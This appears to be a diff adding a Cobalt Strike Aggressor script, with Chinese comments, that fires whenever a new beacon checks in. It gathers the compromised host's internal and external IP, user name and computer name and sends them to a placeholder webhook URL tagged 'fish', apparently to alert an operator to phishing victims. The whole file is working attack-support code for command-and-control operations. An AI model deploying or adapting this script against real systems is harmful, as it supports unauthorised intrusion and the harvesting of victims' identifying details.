@@ -1,0 +1,33 @@
+# 循环获取所有beacon
+on beacon_initial {
+
+	sub http_get {
+		local('$output');
+		$url = [new java.net.URL: $1];
+		$stream = [$url openStream];
+		$handle = [SleepUtils getIOHandle: $stream, $null];
+
+		@content = readAll($handle);
+
+		foreach $line (@content) {
+			$output .= $line . "\r\n";
+		}
+		
+		println($output);
+	}
+	#获取主机相关信息
+	$internalIP = replace(beacon_info($1, "internal"), " ", "_");	#内网IP
+	$userName = replace(beacon_info($1, "user"), " ", "_");	#用户名
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");	#主机名
+	$Process = replace(beacon_info($1, "process"), " ", "_");	#载荷名
+	$Listener = replace(beacon_info($1, "listener"), " ", "_");	#监听器
+	$externalIP = replace(beacon_info($1, "external"), " ", "_");	#公网IP
+	
+	#发送数据到服务端
+	$url = 'http://domain/WebHook.php?source=fish&internalIP='.$internalIP.'&userName='.$userName.'&computerName='.$computerName.'&externalIP='.$externalIP;
+	
+	http_get($url);
+	
+}
+
+
